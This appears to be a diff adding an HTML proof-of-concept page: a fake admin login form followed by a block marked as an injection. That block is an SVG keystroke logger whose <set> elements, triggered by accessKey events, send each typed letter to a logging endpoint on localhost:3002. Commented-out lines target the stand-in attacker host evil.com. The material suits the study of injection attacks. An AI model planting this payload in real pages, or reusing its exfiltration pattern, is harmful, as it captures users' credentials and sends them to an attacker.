@@ -1,0 +1,45 @@
+<html><head></head><body><h3>Admin Login</h3>
+<hr>
+<form>
+  <fieldset>
+    <label>Enter username here</label>
+    <input name="secret" type="username">
+  </fieldset>
+  <fieldset>
+    <label>Enter password here</label>
+    <input name="secret" type="password">
+  </fieldset>
+</form>
+<!--injection-->
+<svg height="0px">
+  <image xmlns:xlink="http://www.w3.org/1999/xlink" xlink:href="http://localhost:3002/log?message=start">
+    <set></set>
+    <set attributeName="xlink:href" begin="accessKey(a)" to="http://localhost:3002/log?message=a"></set>
+    <set attributeName="xlink:href" begin="accessKey(b)" to="http://localhost:3002/log?message=b"></set>
+    <set attributeName="xlink:href" begin="accessKey(c)" to="//localhost:3002/log?message=c"></set>
+    <set attributeName="xlink:href" begin="accessKey(d)" to="//localhost:3002/log?message=d"></set>
+    <set attributeName="xlink:href" begin="accessKey(e)" to="//localhost:3002/log?message=e"></set>
+    <set attributeName="xlink:href" begin="accessKey(f)" to="//localhost:3002/log?message=f"></set>
+    <set attributeName="xlink:href" begin="accessKey(g)" to="//localhost:3002/log?message=g"></set>
+    <set attributeName="xlink:href" begin="accessKey(h)" to="//localhost:3002/log?message=h"></set>
+    <set attributeName="xlink:href" begin="accessKey(i)" to="//localhost:3002/log?message=i"></set>
+    <set attributeName="xlink:href" begin="accessKey(j)" to="//localhost:3002/log?message=j"></set>
+    <set attributeName="xlink:href" begin="accessKey(k)" to="//localhost:3002/log?message=k"></set>
+    <set attributeName="xlink:href" begin="accessKey(l)" to="//localhost:3002/log?message=l"></set>
+    <set attributeName="xlink:href" begin="accessKey(m)" to="//localhost:3002/log?message=m"></set>
+    <set attributeName="xlink:href" begin="accessKey(n)" to="//localhost:3002/log?message=n"></set>
+    <set attributeName="xlink:href" begin="accessKey(o)" to="//localhost:3002/log?message=o"></set>
+    <set attributeName="xlink:href" begin="accessKey(p)" to="//localhost:3002/log?message=p"></set>
+    <set attributeName="xlink:href" begin="accessKey(q)" to="//localhost:3002/log?message=q"></set>
+    <set attributeName="xlink:href" begin="accessKey(r)" to="//localhost:3002/log?message=r"></set>
+    <set attributeName="xlink:href" begin="accessKey(s)" to="//localhost:3002/log?message=s"></set>
+    <set attributeName="xlink:href" begin="accessKey(t)" to="//localhost:3002/log?message=t"></set>
+    <set attributeName="xlink:href" begin="accessKey(u)" to="//localhost:3002/?u"></set>
+<!--    <set attributeName="xlink:href" begin="accessKey(v)" to="//evil.com/?v"></set>-->
+<!--    <set attributeName="xlink:href" begin="accessKey(w)" to="//evil.com/?w"></set>-->
+<!--    <set attributeName="xlink:href" begin="accessKey(x)" to="//evil.com/?x"></set>-->
+<!--    <set attributeName="xlink:href" begin="accessKey(y)" to="//evil.com/?y"></set>-->
+<!--    <set attributeName="xlink:href" begin="accessKey(z)" to="//evil.com/?z"></set>-->
+  </image>
+</svg>
+</body></html>
